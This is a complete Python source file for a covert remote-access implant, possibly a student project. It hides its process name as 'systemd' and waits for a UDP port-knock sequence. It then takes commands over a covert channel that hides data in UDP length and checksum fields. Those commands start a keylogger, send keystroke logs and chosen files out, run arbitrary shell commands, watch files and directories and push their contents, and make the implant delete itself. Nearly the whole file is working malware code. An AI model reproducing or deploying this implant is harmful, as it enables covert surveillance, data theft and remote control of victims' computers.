import logging
import os
import shlex
import socket
import struct
import subprocess
import sys
import time
import threading
from scapy.all import IP, UDP, Raw, sniff, send
from setproctitle import setproctitle
import fcntl

# Needed to implement both for testing against windows and ubuntu
# Use pynput for xorg
try:
    from pynput.keyboard import Key, Listener as PynputListener
    PYNPUT_AVAILABLE = True
except Exception:
    PYNPUT_AVAILABLE = False

# else we use endev for ubuntu wayland (they aint compatible with xorg.....)
try:
    import evdev
    EVDEV_AVAILABLE = True
except ImportError:
    EVDEV_AVAILABLE = False

# Initial port knocking variables
KNOCK_SEQUENCE = [8888, 6666, 4444]
ALLOWED_TIME = 5
knocker_states = {}
connection_established = False

# Protocol
WINDOW_SIZE = 16
TIMEOUT = 2.0
MAX_SEQ= 4096
SLAVE_PORT = 4322

# Session receive timeout is 3 minutes
SESSION_TIMEOUT = 180

# UDP Protocol includes [4 bit flag][12 bit seq][16 bit payload]
FLAG_SYN = "1000"
FLAG_ACK = "0100"
FLAG_FIN = "0010"
FLAG_RST = "0001"
FLAG_NONE = "0000"

OP_DISCONNECT = "0001"
OP_UNINSTALL = "0010"
OP_GET_KEYLOG_FILE = "0101"
OP_UPLOAD = "0110"
OP_FETCH_SPECIFIC = "0111"
OP_WATCH_FILE = "1000"
OP_WATCH_DIR = "1001"
OP_SEND_COMMAND = "1010"
OP_STOP_FILE_WATCH = "1011"
OP_STOP_DIR_WATCH = "1100"
OP_START_KEYLOGGER = "0011"
OP_STOP_KEYLOGGER = "0100"

DEFAULT_FILE = "keylog.txt"
MAX_FILE_SIZE = 102_400

_file_watcher_stops = {}
_dir_watcher_stops = {}
_watcher_lock = threading.Lock()

# Keylogger state
logger = logging.getLogger("Keylogger")
logger.setLevel(logging.DEBUG)
keylog_listener = None
logging_thread = None
_keylog_handler = None

def hide_process(fake_name="systemd"):
    try:
        setproctitle(fake_name)
    except Exception:
        print("Error changing program name")

def bytes_to_bit_str(data: bytes) -> str:
    return "".join(format(b, '08b') for b in data)

def bit_str_to_bytes(bit_str: str) -> bytes:
    return bytes(int(bit_str[i:i+8], 2) for i in range(0, len(bit_str), 8))

def char_str_to_bit_str(char_str: str) -> str:
    return "".join(format(ord(c), '08b') for c in char_str)

def bit_str_to_char_str(bit_str: str) -> str:
    return "".join(chr(int(bit_str[i:i+8], 2)) for i in range(0, len(bit_str), 8))

def pack_frame(flag_str: str, seq: int, payload_bits: str) -> bytes:
    seq_str = format(seq % MAX_SEQ, '012b')
    frame_str = flag_str + seq_str + payload_bits
    return int(frame_str, 2).to_bytes(4, byteorder='big')

def pack_frame_to_udp_fields(flag_str: str, seq_int: int, payload_bits: str):
    seq_bits = format(seq_int & 0xFFF, "012b")
    payload_bits = payload_bits[:16].ljust(16, "0")

    frame_str = flag_str + seq_bits + payload_bits
    frame_int = int(frame_str, 2)

    udp_len = (frame_int >> 16) & 0xFFFF
    udp_chksum = frame_int & 0xFFFF

    return udp_len, udp_chksum

def unpack_frame(raw_bytes: bytes):
    if len(raw_bytes) < 4:
        return None
    frame_str = format(int.from_bytes(raw_bytes[:4], 'big'), '032b')
    return frame_str[:4], int(frame_str[4:16], 2), frame_str[16:]

def payload_from_bytes(data: bytes) -> str:
    if len(data) == 0:
        return "0" * 16
    if len(data) == 1:
        data = data + b'\x00'
    return bytes_to_bit_str(data[:2])

def opcode_payload(opcode_str: str) -> str:
    return opcode_str + "0" * 12

def on_press(key):
    logger.info(f"Pressed: {key}")

def run_user_command(command):
    result = "Command errored out."
    try:
        args = shlex.split(command)
        cmd = args
        if os.name == "nt":
            cmd = ["cmd", "/c"] + args
        response = subprocess.run(cmd, capture_output=True, text=True)
        print(response.stdout)
        result = str(response.stdout)
    except subprocess.CalledProcessError as e:
        result = f"Command '{e.cmd}' returned non-zero exit status {e.returncode}. err: {e.stderr}"
    except FileNotFoundError:
        result = "Command not found. Make sure the command is valid and in your PATH."
    except ValueError as e:
        result = f"Invalid command input: {e}"
    except Exception:
        result = "Command errored out."
    return result

# Keylogging
def start_logging():
    global keylog_listener, _keylog_handler

    # Attach a fresh file handler to the logger
    formatter = logging.Formatter("%(asctime)s: %(message)s")
    fh = logging.FileHandler(DEFAULT_FILE)
    fh.setFormatter(formatter)
    logger.addHandler(fh)
    _keylog_handler = fh

    on_linux = (sys.platform == "linux")

    try:
        if on_linux:
            if EVDEV_AVAILABLE:
                print("[keylogger] Using evdev backend.")
                _evdev_keylogger()

        elif PYNPUT_AVAILABLE:
            print("[keylogger] Using pynput backend.")
            keylog_listener = PynputListener(on_press=on_press)
            keylog_listener.start()
            keylog_listener.join()

        else:
            print("[keylogger] No keylogger backend available.")

    except Exception as e:
        print(f"[keylogger] Error: {e}")
    finally:
        fh.flush()
        fh.close()
        logger.removeHandler(fh)
        _keylog_handler = None

def _find_keyboard_evdev():
    devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
    for dev in devices:
        caps = dev.capabilities(verbose=False)
        key_caps = caps.get(1, [])
        letter_count = sum(1 for k in range(16, 51) if k in key_caps)
        if letter_count >= 20:
            print(f"[keylogger] Found keyboard: {dev.path} — {dev.name}")
            return dev
        dev.close()
    return None

class _EvdevHandle:
    def __init__(self, device):
        self._stop = threading.Event()
        self._dev = device
    def stop(self):
        self._stop.set()
        try:
            self._dev.close()
        except Exception:
            pass

# Evdev keylogger used for linux
def _evdev_keylogger():
    global keylog_listener

    dev = _find_keyboard_evdev()
    if dev is None:
        print("[keylogger] No keyboard device found via evdev. Keylogger inactive.")
        return

    handle = _EvdevHandle(dev)
    keylog_listener = handle

    try:
        for event in dev.read_loop():
            if handle._stop.is_set():
                break
            if event.type == 1 and event.value == 1:
                try:
                    name = evdev.ecodes.KEY[event.code]
                    if isinstance(name, list):
                        name = name[0]
                except (KeyError, IndexError):
                    name = f"KEY_{event.code}"
                logger.info(f"Pressed: {name}")
    except OSError:
        pass
    except Exception as e:
        print(f"[keylogger] evdev read error: {e}")
    finally:
        try:
            dev.close()
        except Exception:
            pass

# sends an ack
def send_ack(target_ip: str, client_sport: int, seq: int):
    udp_len, udp_chksum = pack_frame_to_udp_fields(
        flag_str=FLAG_ACK, seq_int=seq, payload_bits="0" * 16,
    )
    pkt = IP(dst=target_ip) / UDP(
        dport=client_sport, sport=SLAVE_PORT,
        len=udp_len, chksum=udp_chksum,
    )
    send(pkt, verbose=False)

# Sends an abort packet
def send_rst(target_ip: str, client_sport: int):
    udp_len, udp_chksum = pack_frame_to_udp_fields(
        flag_str=FLAG_RST, seq_int=0, payload_bits="0" * 16,
    )
    pkt = IP(dst=target_ip) / UDP(
        dport=client_sport, sport=SLAVE_PORT,
        len=udp_len, chksum=udp_chksum,
    )
    send(pkt, verbose=False)

def _unwrap_ack(ack_mod: int, base_abs: int) -> int:
    era = (base_abs // MAX_SEQ) * MAX_SEQ
    candidate = era + ack_mod
    if candidate < base_abs - MAX_SEQ // 2:
        candidate += MAX_SEQ
    return candidate

# Function to reliably send data to the commander
def send_reliable(target_ip: str, client_sport: int, payload_chunks: list, opcode_str: str, window_size: int = WINDOW_SIZE):
    ack_event = threading.Event()

    # First start a thread to listen for incoming packets
    # This is to determine if the packets sent are acknowledged
    # Then send a quick SYN to first start the message, 
    # then we do it all over again once connection is established
    # After that, we send the full data stream
    def _sniff_ack():
        def _cb(pkt):
            if (pkt.haslayer(UDP)
                    and pkt[IP].src == target_ip
                    and pkt[UDP].sport == client_sport
                    and pkt[UDP].dport == SLAVE_PORT):
                r = unpack_frame(pkt[UDP].len.to_bytes(2, "big")
                                 + pkt[UDP].chksum.to_bytes(2, "big"))
                if r and r[0] == FLAG_ACK:
                    ack_event.set()
        bpf = (f"udp and src host {target_ip} "
               f"and src port {client_sport} and dst port {SLAVE_PORT}")
        sniff(filter=bpf, prn=_cb, store=0,
              stop_filter=lambda p: ack_event.is_set(), timeout=5)

    th = threading.Thread(target=_sniff_ack, daemon=True)
    th.start()
    time.sleep(0.5)

    udp_len, udp_chksum = pack_frame_to_udp_fields(
        flag_str=FLAG_SYN, seq_int=0,
        payload_bits=opcode_payload(opcode_str),
    )
    pkt = IP(dst=target_ip) / UDP(
        dport=client_sport, sport=SLAVE_PORT,
        len=udp_len, chksum=udp_chksum,
    )
    send(pkt, verbose=False)

    th.join(timeout=6)

    if not ack_event.is_set():
        print("[send_reliable] No SYN-ACK received. Aborting.")
        return False

    n = len(payload_chunks)
    base = 1
    next_seq = 1
    lock = threading.Lock()
    done = threading.Event()
    remote_ack = [0]

    # Do the same as before
    def _recv_acks():
        def _cb(pkt):
            if (pkt.haslayer(UDP)
                    and pkt[IP].src == target_ip
                    and pkt[UDP].sport == client_sport
                    and pkt[UDP].dport == SLAVE_PORT):
                r = unpack_frame(pkt[UDP].len.to_bytes(2, "big")
                                 + pkt[UDP].chksum.to_bytes(2, "big"))
                if r:
                    flag, seq, _ = r
                    if flag == FLAG_ACK:
                        with lock:
                            remote_ack[0] = seq
                    elif flag == FLAG_RST:
                        done.set()
        bpf = (f"udp and src host {target_ip} "
               f"and src port {client_sport} and dst port {SLAVE_PORT}")
        while not done.is_set():
            sniff(filter=bpf, prn=_cb, store=0,
                  stop_filter=lambda p: done.is_set(), timeout=5)

    ack_thread = threading.Thread(target=_recv_acks, daemon=True)
    ack_thread.start()
    last_progress = time.time()
    retransmit_count = 0
    MAX_RETRANSMITS = 15

    # Go-back-n strat implemented with timeouts and retransmits according to acks sent by commander
    try:
        while base <= n:
            with lock:
                cur_ack_mod = remote_ack[0]

            abs_ack = _unwrap_ack(cur_ack_mod, base)
            if abs_ack >= base:
                base = abs_ack + 1
                last_progress = time.time()
                retransmit_count = 0
            if time.time() - last_progress > TIMEOUT:
                retransmit_count += 1
                if retransmit_count > MAX_RETRANSMITS:
                    print(f"[send_reliable] No ACKs after {MAX_RETRANSMITS} retransmits. Giving up.")
                    break
                next_seq = base
                last_progress = time.time()
                print(f"[send_reliable] Retransmit #{retransmit_count} from seq={base}")

            while next_seq < base + window_size and next_seq <= n:
                chunk = payload_chunks[next_seq - 1]
                is_fin = (next_seq == n)
                flag = FLAG_FIN if is_fin else FLAG_NONE

                udp_len, udp_chksum = pack_frame_to_udp_fields(
                    flag_str=flag,
                    seq_int=next_seq % MAX_SEQ,
                    payload_bits=payload_from_bytes(chunk),
                )
                pkt = IP(dst=target_ip) / UDP(
                    dport=client_sport, sport=SLAVE_PORT,
                    len=udp_len, chksum=udp_chksum,
                )
                send(pkt, verbose=False)
                next_seq += 1
            time.sleep(0.005)
    finally:
        done.set()
    return True

# Reliably receive data from the commander
def receive_reliable(target_ip: str, client_sport: int, wait_timeout: float = SESSION_TIMEOUT, transfer_timeout: float = SESSION_TIMEOUT):
    chunks = {}
    expected_seq = [0]
    opcode_str= [None]
    result = [None, None]
    local_stop= threading.Event()
    session_started = [False]
    last_activity = [time.time()]

    def _cb(pkt):
        if not (pkt.haslayer(UDP)):
            return
        if pkt[IP].src != target_ip or pkt[UDP].sport != client_sport:
            return
        if pkt[UDP].dport != SLAVE_PORT:
            return

        parsed = unpack_frame(pkt[UDP].len.to_bytes(2, "big") + pkt[UDP].chksum.to_bytes(2, "big"))
        if not parsed:
            return
        flag, seq, payload_bits = parsed
        last_activity[0] = time.time()
        
        # Flags are as followed:
        # SYN used for starting the specific operation so it will always contains the opcode
        if flag == FLAG_SYN:
            chunks.clear()
            opcode_str[0] = payload_bits[:4]
            expected_seq[0] = 1
            session_started[0] = True
            send_ack(target_ip, client_sport, 0)
            return

        # RST for aborting an operation
        if flag == FLAG_RST:
            local_stop.set()
            return

        # FIN to signal the end of an operation data stream
        if flag in (FLAG_NONE, FLAG_FIN):
            if not session_started[0]:
                return
            exp = expected_seq[0]
            if seq == exp % MAX_SEQ:
                chunks[exp] = bit_str_to_bytes(payload_bits)
                send_ack(target_ip, client_sport, seq)
                expected_seq[0] += 1
                if flag == FLAG_FIN:
                    stream = b"".join(chunks[i] for i in sorted(chunks))
                    result[0] = opcode_str[0]
                    result[1] = stream
                    local_stop.set()
            else:
                send_ack(target_ip, client_sport, (exp - 1) % MAX_SEQ)

    bpf = (f"udp and src host {target_ip} "
           f"and src port {client_sport} and dst port {SLAVE_PORT}")

    def _sniff_worker():
        while not local_stop.is_set():
            sniff(filter=bpf, prn=_cb, store=0, stop_filter=lambda p: local_stop.is_set(), timeout=3)
        local_stop.set()

    st = threading.Thread(target=_sniff_worker, daemon=True)
    st.start()

    while not local_stop.is_set():
        idle = time.time() - last_activity[0]
        limit = transfer_timeout if session_started[0] else wait_timeout
        if idle > limit:
            local_stop.set()
            break
        time.sleep(0.1)

    st.join(timeout=2)
    return result[0], result[1]

# Extracts the file data and also formats it into a ready to use file transfer protocol
# file name size, file name, file size, file
def serialize_file(filepath: str) -> bytes:
    name = os.path.basename(filepath).encode('utf-8')
    with open(filepath, 'rb') as f:
        data = f.read(MAX_FILE_SIZE)
    return len(name).to_bytes(2, 'big') + name + len(data).to_bytes(4, 'big') + data

# Decodes the byte stream
def deserialize_stream(stream: bytes):
    idx = 0
    name_size = int.from_bytes(stream[idx:idx+2], 'big'); idx += 2
    filename = stream[idx:idx+name_size].decode('utf-8'); idx += name_size
    file_size = int.from_bytes(stream[idx:idx+4], 'big'); idx += 4
    file_data = stream[idx:idx+file_size]
    return filename, file_data

# Converts data into 2 byte chunks
# Needed for the udp len and chksum fields
def stream_to_chunks(data: bytes) -> list:
    chunks = []
    for i in range(0, len(data), 2):
        chunk = data[i:i+2]
        if len(chunk) == 1:
            chunk += b'\x00'
        chunks.append(chunk)
    return chunks or [b'\x00\x00']

# Just return false as returning false will disconnect the connection
def handle_disconnect(client_ip: str, client_sport: int, stream: bytes):
    print(f"[0001] Disconnect requested by {client_ip}.")
    return False

# Uninstall the program
# Works differently for both win and linux but has the same result
def handle_uninstall(client_ip: str, client_sport: int, stream: bytes):
    print(f"[0010] Uninstalling")
    script_path = os.path.abspath(sys.argv[0])
    try:
        os.remove(script_path)
        print(f"[0010] Deleted '{script_path}'.")
    except OSError as e:
        print(f"[0010] Error deleting script file: {e}")

    print("[0010] Terminating process.")
    os._exit(0)

# Start the keylogger
def handle_start_keylogger(client_ip: str, client_sport: int, stream: bytes):
    print("[0011] Starting Keylogger")
    global logging_thread
    if logging_thread is None or not logging_thread.is_alive():
        logging_thread = threading.Thread(target=start_logging, daemon=True)
        logging_thread.start()
    return True

# Stop keylogger
def handle_stop_keylogger(client_ip: str, client_sport: int, stream: bytes):
    print("[0100] Stopping Keylogger")
    global keylog_listener, logging_thread, _keylog_handler

    # Stop the pynput listener
    if keylog_listener is not None:
        try:
            keylog_listener.stop()
        except Exception:
            pass
        keylog_listener = None

    # Wait for the logging thread to finish cleanup
    if logging_thread is not None:
        logging_thread.join(timeout=5)
        logging_thread = None

    # Flush any remaining handlers
    if _keylog_handler is not None:
        try:
            _keylog_handler.flush()
            _keylog_handler.close()
            logger.removeHandler(_keylog_handler)
        except Exception:
            pass
        _keylog_handler = None

    return True

# Fetches the keylog file when requested
def handle_fetch_default(client_ip: str, client_sport: int, stream: bytes):
    global _keylog_handler
    print(f"[0101] Fetch Default File request from {client_ip}")

    # Flush/reset any active keylog handler
    if _keylog_handler is not None:
        try:
            _keylog_handler.flush()
        except Exception:
            pass

    if not os.path.exists(DEFAULT_FILE):
        with open(DEFAULT_FILE, 'w') as f:
            f.write("(no keystrokes captured yet)\n")

    out_stream = serialize_file(DEFAULT_FILE)
    chunks = stream_to_chunks(out_stream)
    send_reliable(client_ip, client_sport, chunks, OP_GET_KEYLOG_FILE)
    print(f"[0101] Sent '{DEFAULT_FILE}' ({len(out_stream)} bytes)")

    # Delete the keylog file right after sending
    if os.path.exists(DEFAULT_FILE):
        os.remove(DEFAULT_FILE)
        print(f"[0101] Deleted '{DEFAULT_FILE}'.")
    return True

# Transfers a file from commander
def handle_upload(client_ip: str, client_sport: int, stream: bytes):
    print(f"[0110] Upload request from {client_ip}")
    filename, file_data = deserialize_stream(stream)
    save_path = os.path.join("uploads", filename)
    os.makedirs("uploads", exist_ok=True)
    with open(save_path, 'wb') as f:
        f.write(file_data)
    print(f"[0110] Saved '{filename}' ({len(file_data)} bytes) to {save_path}")
    return True

# Transfers a file to commander
def handle_fetch_specific(client_ip: str, client_sport: int, stream: bytes):
    print(f"[0111] Fetch Specific File request from {client_ip}")
    name_size = int.from_bytes(stream[:2], 'big')
    filename = stream[2:2+name_size].decode('utf-8')
    print(f"[0111] Looking for file: '{filename}'")

    if not os.path.exists(filename):
        print(f"[0111] File not found: '{filename}'")
        send_rst(client_ip, client_sport)
        return True

    out_stream = serialize_file(filename)
    chunks = stream_to_chunks(out_stream)
    send_reliable(client_ip, client_sport, chunks, OP_FETCH_SPECIFIC)
    print(f"[0111] Sent '{filename}' ({len(out_stream)} bytes)")
    return True

# Remote execution command
def handle_terminal_command(client_ip: str, client_sport: int, stream: bytes):
    msg_size = int.from_bytes(stream[:2], 'big')
    message = stream[2:2+msg_size].decode('utf-8')
    reply = run_user_command(message)
    reply_bytes = reply.encode('utf-8')
    out_stream = len(reply_bytes).to_bytes(2, 'big') + reply_bytes
    chunks = stream_to_chunks(out_stream)
    send_reliable(client_ip, client_sport, chunks, OP_SEND_COMMAND)
    return True

# Function to handle file watching
def handle_watch_file(client_ip: str, client_sport: int, stream: bytes):
    print(f"[1000] Watch File request from {client_ip}")
    name_size = int.from_bytes(stream[:2], 'big')
    filename = stream[2:2+name_size].decode('utf-8')
    print(f"[1000] Watching file: '{filename}'")

    stop_evt = threading.Event()
    key = (client_ip, client_sport, filename)
    with _watcher_lock:
        if key in _file_watcher_stops:
            _file_watcher_stops[key].set()
        _file_watcher_stops[key] = stop_evt

    def _watcher():
        try:
            last_mtime = os.path.getmtime(filename)
        except FileNotFoundError:
            print(f"[1000] File '{filename}' not found. Exiting watcher.")
            return

        while not stop_evt.is_set():
            time.sleep(1)
            try:
                mtime = os.path.getmtime(filename)
            except FileNotFoundError:
                print(f"[1000] File '{filename}' deleted. Stopping watcher.")
                break
            if mtime != last_mtime:
                last_mtime = mtime
                print(f"[1000] Change detected in '{filename}'. Pushing update.")
                out_stream = serialize_file(filename)
                chunks = stream_to_chunks(out_stream)
                send_reliable(client_ip, client_sport, chunks, OP_WATCH_FILE)

        with _watcher_lock:
            _file_watcher_stops.pop(key, None)
        print(f"[1000] Watcher stopped for '{filename}'.")

    threading.Thread(target=_watcher, daemon=True).start()
    return True

# When watching directory we want to find the main 4 operations: Creation, Updating, Deletion, and Renaming
def handle_watch_dir(client_ip: str, client_sport: int, stream: bytes):
    print(f"[1001] Watch Directory request from {client_ip}")
    name_size = int.from_bytes(stream[:2], 'big')
    dirpath = stream[2:2+name_size].decode('utf-8')
    print(f"[1001] Watching directory: '{dirpath}'")

    if not os.path.isdir(dirpath):
        print(f"[1001] Directory '{dirpath}' not found.")
        send_rst(client_ip, client_sport)
        return True

    stop_evt = threading.Event()
    key = (client_ip, client_sport, dirpath)
    with _watcher_lock:
        if key in _dir_watcher_stops:
            _dir_watcher_stops[key].set()
        _dir_watcher_stops[key] = stop_evt

    def _snapshot(path):
        by_path = {}
        by_inode = {}
        for root, _, files in os.walk(path):
            for fname in files:
                fp = os.path.join(root, fname)
                try:
                    st = os.stat(fp)
                    by_path[fp] = (st.st_mtime, st.st_ino)
                    by_inode[st.st_ino] = fp
                except OSError:
                    pass
        return by_path, by_inode

    def _send_event(event_type: str, filepath: str, file_data: bytes = b''):
        type_bytes = event_type.encode('utf-8')
        name_bytes = filepath.encode('utf-8')
        envelope = (
            len(type_bytes).to_bytes(1, 'big') + type_bytes +
            len(name_bytes).to_bytes(2, 'big') + name_bytes +
            len(file_data).to_bytes(4, 'big') + file_data
        )
        chunks = stream_to_chunks(envelope)
        send_reliable(client_ip, client_sport, chunks, OP_WATCH_DIR)

    def _watcher():
        prev_by_path, prev_by_inode = _snapshot(dirpath)

        while not stop_evt.is_set():
            time.sleep(2)
            curr_by_path, curr_by_inode = _snapshot(dirpath)

            disappeared = set(prev_by_path) - set(curr_by_path)
            appeared = set(curr_by_path) - set(prev_by_path)

            # Rename operation
            renamed_inodes = set()
            for old_fp in list(disappeared):
                if stop_evt.is_set():
                    break
                old_inode = prev_by_path[old_fp][1]
                new_fp = curr_by_inode.get(old_inode)
                if new_fp and new_fp in appeared:
                    old_name = os.path.basename(old_fp)
                    new_name = os.path.basename(new_fp)
                    print(f"[1001] renamed: {old_name} -> {new_name}")
                    try:
                        with open(new_fp, 'rb') as f:
                            data = f.read(MAX_FILE_SIZE)
                        # Both names packed with a null separator
                        _send_event('rename', f"{old_name}\x00{new_name}", data)
                    except OSError as e:
                        print(f"[1001] Could not read '{new_fp}': {e}")
                    renamed_inodes.add(old_inode)
                    disappeared.discard(old_fp)
                    appeared.discard(new_fp)

            # Create/Update operation
            for fp in curr_by_path:
                if stop_evt.is_set():
                    break
                inode = curr_by_path[fp][1]
                if inode in renamed_inodes:
                    continue
                if fp in appeared:
                    print(f"[1001] created: {fp}")
                    try:
                        with open(fp, 'rb') as f:
                            data = f.read(MAX_FILE_SIZE)
                        _send_event('upsert', os.path.basename(fp), data)
                    except OSError as e:
                        print(f"[1001] Could not read '{fp}': {e}")
                elif fp in prev_by_path and prev_by_path[fp][0] != curr_by_path[fp][0]:
                    print(f"[1001] modified: {fp}")
                    try:
                        with open(fp, 'rb') as f:
                            data = f.read(MAX_FILE_SIZE)
                        _send_event('upsert', os.path.basename(fp), data)
                    except OSError as e:
                        print(f"[1001] Could not read '{fp}': {e}")

            # Delete operation
            for old_fp in disappeared:
                if stop_evt.is_set():
                    break
                inode = prev_by_path[old_fp][1]
                if inode in renamed_inodes:
                    continue
                print(f"[1001] deleted: {old_fp}")
                _send_event('delete', os.path.basename(old_fp))

            prev_by_path, prev_by_inode = curr_by_path, curr_by_inode

        with _watcher_lock:
            _dir_watcher_stops.pop(key, None)
        print(f"[1001] Dir watcher stopped for '{dirpath}'.")

    threading.Thread(target=_watcher, daemon=True).start()
    return True

# Stop file watch when we receive the opcode for it from the commander
def handle_stop_file_watch(client_ip: str, client_sport: int, stream: bytes):
    name_size = int.from_bytes(stream[:2], 'big')
    filename = stream[2:2+name_size].decode('utf-8')
    key = (client_ip, client_sport, filename)
    with _watcher_lock:
        evt = _file_watcher_stops.pop(key, None)
    if evt:
        evt.set()
        print(f"[1011] Stopped file watcher for '{filename}'.")
    else:
        print(f"[1011] No active file watcher found for '{filename}'.")
    return True

# Stop directory watch when we receive the opcode for it from the commander
def handle_stop_dir_watch(client_ip: str, client_sport: int, stream: bytes):
    name_size = int.from_bytes(stream[:2], 'big')
    dirpath = stream[2:2+name_size].decode('utf-8')
    key = (client_ip, client_sport, dirpath)
    with _watcher_lock:
        evt = _dir_watcher_stops.pop(key, None)
    if evt:
        evt.set()
        print(f"[1100] Stopped dir watcher for '{dirpath}'.")
    else:
        print(f"[1100] No active dir watcher found for '{dirpath}'.")
    return True

# Dispatcher
# Dict for easy routing to different functions depending on the operation code
OPCODE_DISPATCH = {
    OP_DISCONNECT: handle_disconnect,
    OP_UNINSTALL: handle_uninstall,
    OP_START_KEYLOGGER: handle_start_keylogger,
    OP_STOP_KEYLOGGER: handle_stop_keylogger,
    OP_GET_KEYLOG_FILE: handle_fetch_default,
    OP_UPLOAD: handle_upload,
    OP_FETCH_SPECIFIC: handle_fetch_specific,
    OP_SEND_COMMAND: handle_terminal_command,
    OP_WATCH_FILE: handle_watch_file,
    OP_WATCH_DIR: handle_watch_dir,
    OP_STOP_FILE_WATCH: handle_stop_file_watch,
    OP_STOP_DIR_WATCH: handle_stop_dir_watch,
}

# Function to receive a message from the commander
# We extract the opcode and byte stream first before routing the byte stream to the correct operation
def recv_message(target_ip: str, client_sport: int):
    print(f"[server] Waiting on {target_ip} "
          f"(client sport={client_sport}, timeout={SESSION_TIMEOUT}s)")
    opcode, stream = receive_reliable(target_ip, client_sport)

    if opcode is None or stream is None:
        print("[server] Session timed out or RST received.")
        return False

    print(f"[server] Opcode received: {opcode}")
    handler = OPCODE_DISPATCH.get(opcode)
    if handler is None:
        print(f"[server] Unknown opcode '{opcode}'. Ignoring.")
        return True

    result = handler(target_ip, client_sport, stream)
    return result if result is not None else True

# Need to keep track of stuff like different connections to find the right one
def packet_callback(packet):
    global connection_established

    if not (packet.haslayer('IP') and packet.haslayer(UDP)):
        return

    ip = packet['IP'].src
    port = packet[UDP].dport
    current_time = time.time()

    # First add the ip to knocker states, else increment the count of its sucessful knocks
    if ip not in knocker_states:
        knocker_states[ip] = {
            'step': 0, 
            'last_time': current_time,
            'unlocked': False, 
            'port': 0, 
            'established': False
        }
    else:
        if current_time - knocker_states[ip]['last_time'] > ALLOWED_TIME:
            print(f"Timeout for {ip}. Resetting sequence.")
            knocker_states[ip] = {
                'step': 0, 
                'last_time': current_time,
                'unlocked': False, 
                'port': 0, 
                'established': False
            }

    knocker_states[ip]['last_time'] = current_time

    # If the final probe has been received, then we send an ACK and establish the connection
    # Note that there is no reliability here so connection might fail on the off chance
    if knocker_states[ip].get('unlocked'):
        if port == SLAVE_PORT:
            client_sport = packet[UDP].sport
            print(f"Confirmation probe from {ip} (sport={client_sport}). Sending ACK.")
            udp_len, udp_chksum = pack_frame_to_udp_fields(FLAG_ACK, 0, "0" * 16)
            ack = IP(dst=ip) / UDP(sport=SLAVE_PORT, dport=client_sport, len=udp_len, chksum=udp_chksum)
            send(ack, verbose=False)
            knocker_states[ip]['port'] = client_sport
            knocker_states[ip]['established'] = True
            connection_established = True
        return

    # If the knock sequence is complete, we will wait for the final probe to the slave's port
    expected_port = KNOCK_SEQUENCE[knocker_states[ip]['step']]
    if port == expected_port:
        knocker_states[ip]['step'] += 1
        step = knocker_states[ip]['step']
        print(f"Knock {step}/{len(KNOCK_SEQUENCE)} from {ip} on port {port}")
        if step == len(KNOCK_SEQUENCE):
            print(f"Sequence complete for {ip}! Waiting for final probe on port {SLAVE_PORT}.")
            knocker_states[ip]['unlocked'] = True
    else:
        knocker_states[ip]['step'] = 0
        knocker_states[ip]['unlocked'] = False

def stop_sniffer(packet):
    return connection_established

if __name__ == "__main__":
    # Conceal the process name first before doing anything else
    try:
        print("Changing program name...")
        hide_process("systemd")
    except Exception:
        print("Error changing program name")

    while True:
        # Port knock into establishing connection
        connection_established = False
        knocker_states.clear()
        print("Listening for port knocks...")
        sniff(filter="udp", prn=packet_callback, store=0, stop_filter=stop_sniffer)
        print("Connection Established! Exiting sniffer.")

        client_ip = ""
        client_sport = 0
        for k, v in knocker_states.items():
            if v.get("established"):
                print(f"Found established connection: {k}  sport={v['port']}")
                client_ip = k
                client_sport = v["port"]
                break

        if not client_ip:
            print("[server] ERROR: Could not identify established client. Restarting.")
            continue

        print(f"Connected: ip={client_ip}  client_sport={client_sport}")

        # Continuously listen for incoming operations
        # Once any operation returns false, we know to disconnect the client
        disconnect = False
        while not disconnect:
            disconnect = not recv_message(client_ip, client_sport)

        print(f"Disconnected from client {client_ip}:{client_sport}")